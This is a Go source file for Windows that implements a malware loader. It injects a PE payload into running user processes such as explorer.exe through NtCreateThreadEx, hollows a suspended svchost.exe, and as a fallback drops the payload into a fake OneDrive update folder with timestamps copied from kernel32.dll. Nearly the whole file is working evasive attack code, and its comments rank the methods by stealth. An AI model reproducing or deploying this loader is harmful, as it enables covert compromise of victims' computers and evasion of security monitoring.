//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// loadPayload tries injection methods in order of stealth:
//  1. Inject PE into an existing low-risk process (no new process event).
//  2. Classic process hollowing into a new suspended svchost.
//  3. Drop to disk and exec (noisiest, last resort).
func loadPayload(payload []byte) {
	if err := injectExisting(payload); err == nil {
		return
	}
	if err := hollowLoad(payload); err != nil {
		dropAndExec(payload)
	}
}

func hollowLoad(payload []byte) error {
	if len(payload) < 0x40 {
		return fmt.Errorf("payload too small")
	}
	if payload[0] != 0x4d || payload[1] != 0x5a {
		return fmt.Errorf("not a PE")
	}
	eLfanew := int(binary.LittleEndian.Uint32(payload[0x3c:]))
	if eLfanew+24 > len(payload) || binary.LittleEndian.Uint32(payload[eLfanew:]) != 0x00004550 {
		return fmt.Errorf("invalid PE")
	}
	machine := binary.LittleEndian.Uint16(payload[eLfanew+4:])
	if machine != 0x8664 {
		return fmt.Errorf("only AMD64 PE supported")
	}

	optOff := eLfanew + 24
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	numSections := int(binary.LittleEndian.Uint16(payload[eLfanew+6:]))
	sizeOfOptHdr := int(binary.LittleEndian.Uint16(payload[eLfanew+20:]))
	sectTableOff := eLfanew + 24 + sizeOfOptHdr

	// Relocation data directory (index 5) at optOff+160 for PE32+
	relocRVA := uint32(0)
	relocSize := uint32(0)
	if optOff+168 <= len(payload) {
		relocRVA = binary.LittleEndian.Uint32(payload[optOff+160:])
		relocSize = binary.LittleEndian.Uint32(payload[optOff+164:])
	}

	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	hostExe := filepath.Join(sysRoot, "System32", "svchost.exe")
	hostExePtr, _ := windows.UTF16PtrFromString(hostExe + " -k netsvcs")

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation
	if err := windows.CreateProcess(
		nil, hostExePtr, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, &si, &pi,
	); err != nil {
		return fmt.Errorf("CreateProcess: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	k32 := windows.NewLazySystemDLL("kernel32.dll")

	ntQueryInfo := ntdll.NewProc("NtQueryInformationProcess")
	ntUnmap := ntdll.NewProc("NtUnmapViewOfSection")
	virtualAllocEx := k32.NewProc("VirtualAllocEx")
	writeProcessMemory := k32.NewProc("WriteProcessMemory")
	readProcessMemory := k32.NewProc("ReadProcessMemory")
	getThreadContext := k32.NewProc("GetThreadContext")
	setThreadContext := k32.NewProc("SetThreadContext")

	// Get PEB address
	type processBasicInfo struct {
		Reserved1       uintptr
		PebBaseAddress  uintptr
		Reserved2       [2]uintptr
		UniqueProcessId uintptr
		Reserved3       uintptr
	}
	var pbi processBasicInfo
	ntQueryInfo.Call(
		uintptr(pi.Process), 0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi), 0,
	)

	// Read PEB.ImageBaseAddress (offset 0x10 in x64 PEB)
	var remoteBase uint64
	readProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+0x10,
		uintptr(unsafe.Pointer(&remoteBase)),
		8, 0,
	)

	// Unmap existing image
	ntUnmap.Call(uintptr(pi.Process), uintptr(remoteBase))

	// Allocate at preferred base first, fall back to any address
	const memCommitReserve = 0x3000
	const pageExecReadWrite = 0x40
	allocBase, _, _ := virtualAllocEx.Call(
		uintptr(pi.Process), uintptr(imageBase),
		uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
	)
	if allocBase == 0 {
		allocBase, _, _ = virtualAllocEx.Call(
			uintptr(pi.Process), 0,
			uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
		)
	}
	if allocBase == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	// Write headers
	writeProcessMemory.Call(
		uintptr(pi.Process), allocBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(sizeOfHeaders), 0,
	)

	// Write sections
	for i := 0; i < numSections; i++ {
		secOff := sectTableOff + i*40
		if secOff+40 > len(payload) {
			break
		}
		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
		rawSize := binary.LittleEndian.Uint32(payload[secOff+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[secOff+20:])
		if rawSize == 0 || int(rawPtr)+int(rawSize) > len(payload) {
			continue
		}
		writeProcessMemory.Call(
			uintptr(pi.Process),
			allocBase+uintptr(virtualAddr),
			uintptr(unsafe.Pointer(&payload[rawPtr])),
			uintptr(rawSize), 0,
		)
	}

	// Apply base relocations if the image wasn't loaded at its preferred base
	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		relocRaw := rvaToRaw(payload, sectTableOff, numSections, relocRVA)
		if relocRaw > 0 && relocRaw+int(relocSize) <= len(payload) {
			applyRelocs(pi.Process, writeProcessMemory, readProcessMemory,
				payload[relocRaw:relocRaw+int(relocSize)],
				allocBase, delta)
		}
	}

	// Update PEB.ImageBaseAddress
	newBase := uint64(allocBase)
	writeProcessMemory.Call(
		uintptr(pi.Process), pbi.PebBaseAddress+0x10,
		uintptr(unsafe.Pointer(&newBase)), 8, 0,
	)

	// Get/Set thread context to redirect RIP to our entry point.
	// AMD64 CONTEXT is 1232 bytes, must be 16-byte aligned.
	ctxRaw := make([]byte, 1232+16)
	align := uintptr(16) - (uintptr(unsafe.Pointer(&ctxRaw[0])) & 15)
	if align == 16 {
		align = 0
	}
	ctx := ctxRaw[align : align+1232]
	// ContextFlags at offset 48; CONTEXT_FULL for AMD64 = 0x10003F
	binary.LittleEndian.PutUint32(ctx[48:], 0x10003f)
	getThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))
	// Set Rip (offset 248 in AMD64 CONTEXT) to entry point
	entryAddr := allocBase + uintptr(entryRVA)
	binary.LittleEndian.PutUint64(ctx[248:], uint64(entryAddr))
	setThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))

	windows.ResumeThread(pi.Thread)
	return nil
}

// rvaToRaw converts a virtual address (RVA) to a raw file offset using the section table.
func rvaToRaw(payload []byte, sectTableOff, numSections int, rva uint32) int {
	for i := 0; i < numSections; i++ {
		off := sectTableOff + i*40
		if off+40 > len(payload) {
			break
		}
		virtualAddr := binary.LittleEndian.Uint32(payload[off+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[off+8:])
		rawPtr := binary.LittleEndian.Uint32(payload[off+20:])
		if rva >= virtualAddr && rva < virtualAddr+virtualSize {
			return int(rawPtr + rva - virtualAddr)
		}
	}
	return 0
}

// applyRelocs patches base relocation entries in the remote process.
func applyRelocs(process windows.Handle, write, read *windows.LazyProc,
	relocData []byte, allocBase uintptr, delta int64) {
	pos := 0
	for pos+8 <= len(relocData) {
		blockRVA := binary.LittleEndian.Uint32(relocData[pos:])
		blockSize := binary.LittleEndian.Uint32(relocData[pos+4:])
		if blockSize < 8 {
			break
		}
		numEntries := int(blockSize-8) / 2
		for i := 0; i < numEntries; i++ {
			if pos+8+i*2+2 > len(relocData) {
				break
			}
			entry := binary.LittleEndian.Uint16(relocData[pos+8+i*2:])
			relType := entry >> 12
			relOff := entry & 0x0fff
			if relType == 10 { // IMAGE_REL_BASED_DIR64
				addr := allocBase + uintptr(blockRVA) + uintptr(relOff)
				var orig uint64
				read.Call(uintptr(process), addr, uintptr(unsafe.Pointer(&orig)), 8, 0)
				orig = uint64(int64(orig) + delta)
				write.Call(uintptr(process), addr, uintptr(unsafe.Pointer(&orig)), 8, 0)
			}
		}
		pos += int(blockSize)
	}
}

// dropAndExec: fallback when hollowing fails. Writes to a random APPDATA path and executes.
func dropAndExec(payload []byte) {
	appdata := os.Getenv("LOCALAPPDATA")
	if appdata == "" {
		appdata = os.Getenv("APPDATA")
	}
	if appdata == "" {
		appdata = os.TempDir()
	}
	dir := filepath.Join(appdata, `Microsoft\OneDrive\Update`)
	_ = os.MkdirAll(dir, 0755)
	tmpPath := dir + `\` + randName() + ".exe"
	if err := os.WriteFile(tmpPath, payload, 0755); err != nil {
		return
	}
	stompFileTime(tmpPath)
	cmdPtr, err := windows.UTF16PtrFromString(tmpPath)
	if err != nil {
		return
	}
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation
	_ = windows.CreateProcess(nil, cmdPtr, nil, nil, false,
		windows.CREATE_NO_WINDOW, nil, nil, &si, &pi)
}

func randName() string {
	p := make([]byte, 6)
	x := uintptr(unsafe.Pointer(&p[0]))
	const hx = "0123456789abcdef"
	out := make([]byte, 12)
	for i := range out {
		out[i] = hx[x&0xf]
		x >>= 4
	}
	return string(out)
}

// injectExisting finds a running low-risk host process and injects the payload
// PE into it using NtCreateThreadEx — no new process event is generated.
func injectExisting(payload []byte) error {
	if len(payload) < 0x40 || payload[0] != 0x4d || payload[1] != 0x5a {
		return fmt.Errorf("not a PE")
	}
	eLfanew := int(binary.LittleEndian.Uint32(payload[0x3c:]))
	if eLfanew+24 > len(payload) {
		return fmt.Errorf("bad PE")
	}
	optOff := eLfanew + 24
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	numSections := int(binary.LittleEndian.Uint16(payload[eLfanew+6:]))
	sizeOfOptHdr := int(binary.LittleEndian.Uint16(payload[eLfanew+20:]))
	sectTableOff := eLfanew + 24 + sizeOfOptHdr
	relocRVA, relocSize := uint32(0), uint32(0)
	if optOff+168 <= len(payload) {
		relocRVA = binary.LittleEndian.Uint32(payload[optOff+160:])
		relocSize = binary.LittleEndian.Uint32(payload[optOff+164:])
	}

	pid, err := findHostPID()
	if err != nil {
		return err
	}

	proc, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer windows.CloseHandle(proc)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	ntCreateThread := ntdll.NewProc("NtCreateThreadEx")
	virtualAllocEx := k32.NewProc("VirtualAllocEx")
	writeProcessMemory := k32.NewProc("WriteProcessMemory")
	readProcessMemory := k32.NewProc("ReadProcessMemory")

	const memCommitReserve = 0x3000
	const pageExecReadWrite = 0x40

	allocBase, _, _ := virtualAllocEx.Call(
		uintptr(proc), uintptr(imageBase),
		uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
	)
	if allocBase == 0 {
		allocBase, _, _ = virtualAllocEx.Call(
			uintptr(proc), 0,
			uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
		)
	}
	if allocBase == 0 {
		return fmt.Errorf("VirtualAllocEx failed in target")
	}

	writeProcessMemory.Call(uintptr(proc), allocBase,
		uintptr(unsafe.Pointer(&payload[0])), uintptr(sizeOfHeaders), 0)

	for i := 0; i < numSections; i++ {
		secOff := sectTableOff + i*40
		if secOff+40 > len(payload) {
			break
		}
		va := binary.LittleEndian.Uint32(payload[secOff+12:])
		rawSz := binary.LittleEndian.Uint32(payload[secOff+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[secOff+20:])
		if rawSz == 0 || int(rawPtr)+int(rawSz) > len(payload) {
			continue
		}
		writeProcessMemory.Call(uintptr(proc), allocBase+uintptr(va),
			uintptr(unsafe.Pointer(&payload[rawPtr])), uintptr(rawSz), 0)
	}

	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		relocRaw := rvaToRaw(payload, sectTableOff, numSections, relocRVA)
		if relocRaw > 0 && relocRaw+int(relocSize) <= len(payload) {
			applyRelocs(proc, writeProcessMemory, readProcessMemory,
				payload[relocRaw:relocRaw+int(relocSize)], allocBase, delta)
		}
	}

	entryAddr := allocBase + uintptr(entryRVA)
	var threadHandle uintptr
	r, _, _ := ntCreateThread.Call(
		uintptr(unsafe.Pointer(&threadHandle)), // ThreadHandle
		0x1FFFFF,                               // DesiredAccess (THREAD_ALL_ACCESS)
		0,                                      // ObjectAttributes
		uintptr(proc),                          // ProcessHandle
		entryAddr,                              // StartRoutine
		0,                                      // Argument
		0,                                      // CreateFlags (0 = run immediately)
		0, 0, 0, 0,                             // ZeroBits, StackSize, MaxStackSize, AttributeList
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: status 0x%x", r)
	}
	if threadHandle != 0 {
		windows.CloseHandle(windows.Handle(threadHandle))
	}
	return nil
}

// candidateProcesses are benign host targets for thread injection, ordered by preference.
// All run as the current user (no elevation needed to open them).
var candidateProcesses = []string{
	"RuntimeBroker.exe",
	"SearchHost.exe",
	"SearchIndexer.exe",
	"explorer.exe",
	"sihost.exe",
	"ctfmon.exe",
	"dllhost.exe",
}

// findHostPID returns the PID of the first running candidate process owned by
// the current user that we can open with VM + thread rights.
func findHostPID() (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := windows.Process32First(snap, &entry); err != nil {
		return 0, err
	}

	for _, candidate := range candidateProcesses {
		// Reset snapshot scan for each candidate.
		entry.Size = uint32(unsafe.Sizeof(entry))
		_ = windows.Process32First(snap, &entry)
		for {
			name := windows.UTF16ToString(entry.ExeFile[:])
			if equalFold(name, candidate) {
				// Quick open-test to see if we have access.
				h, err := windows.OpenProcess(
					windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
						windows.PROCESS_VM_WRITE|windows.PROCESS_QUERY_INFORMATION,
					false, entry.ProcessID)
				if err == nil {
					windows.CloseHandle(h)
					return entry.ProcessID, nil
				}
			}
			if windows.Process32Next(snap, &entry) != nil {
				break
			}
		}
	}
	return 0, fmt.Errorf("no suitable host process found")
}

// stompFileTime copies kernel32.dll timestamps onto path to blend with system files.
func stompFileTime(path string) {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	ref := filepath.Join(sysRoot, `System32\kernel32.dll`)
	rp, err := windows.UTF16PtrFromString(ref)
	if err != nil {
		return
	}
	rh, err := windows.CreateFile(rp, windows.GENERIC_READ, windows.FILE_SHARE_READ,
		nil, windows.OPEN_EXISTING, windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(rh)
	var cT, aT, wT windows.Filetime
	if err := windows.GetFileTime(rh, &cT, &aT, &wT); err != nil {
		return
	}
	tp, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	th, err := windows.CreateFile(tp,
		windows.FILE_WRITE_ATTRIBUTES, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil, windows.OPEN_EXISTING, windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(th)
	_ = windows.SetFileTime(th, &cT, &aT, &wT)
}

// equalFold is a simple ASCII case-insensitive comparison to avoid importing strings.
func equalFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}
